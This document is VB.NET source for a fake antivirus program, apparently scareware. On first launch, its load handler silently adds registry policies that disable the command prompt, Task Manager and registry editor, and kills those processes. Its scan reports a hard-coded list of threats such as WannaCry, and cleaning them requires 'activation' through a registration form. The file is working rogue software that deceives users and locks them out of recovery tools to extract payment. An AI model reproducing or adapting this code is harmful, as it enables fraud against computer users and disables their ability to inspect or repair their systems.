
Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        boxthreats.Items.Clear()
        Label8.Hide()
        If My.Settings.isActivated = "Yes" Then
            Label4.Hide()
            Button4.Hide()
        Else
            Label9.Hide()
        End If
        If My.Settings.isFirstRun = "Yes" Then
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 1")
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1")
            Shell("reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1")
            Shell("tskill /a cmd")
            Shell("tskill /a regedit")
            Shell("tskill /a taskmgr")
            My.Settings.isFirstRun = "No"
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Timer1.Start()
        boxthreats.Items.Clear()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        If boxthreats.Items.Contains("Win32.Trojan.ILoveYou") And My.Settings.isActivated = "No" Then
            register_form.Show()
        ElseIf boxthreats.Items.Contains("Win32.Trojan.ILoveYou") Then
            boxthreats.Items.Clear()
            boxthreats.Items.Add("Cleaned !")
            My.Settings.isAllThreadsCleaned = "Yes"
        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Me.Close()
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        register_form.Show()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(1)
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            If My.Settings.isAllThreadsCleaned = "No" Then
                boxthreats.Items.Add("Win32.Trojan.ILoveYou")
                boxthreats.Items.Add("Win32.Ransom.WannaCry")
                boxthreats.Items.Add("Win32.Adware.Enderman")
                boxthreats.Items.Add("Win32.Spyware.K8nL")
                ProgressBar1.Value = 0
                Timer1.Stop()
            Else
                ProgressBar1.Value = 0
                Timer1.Stop()
                boxthreats.Items.Add("Nothing found !")
            End If
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        ProgressBar2.Increment(1)
        If ProgressBar2.Value = ProgressBar2.Maximum Then
            Timer2.Stop()
            Label8.Show()
            ProgressBar2.Value = "0"
        End If
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Timer2.Start()
        Label8.Hide()
    End Sub
End Class
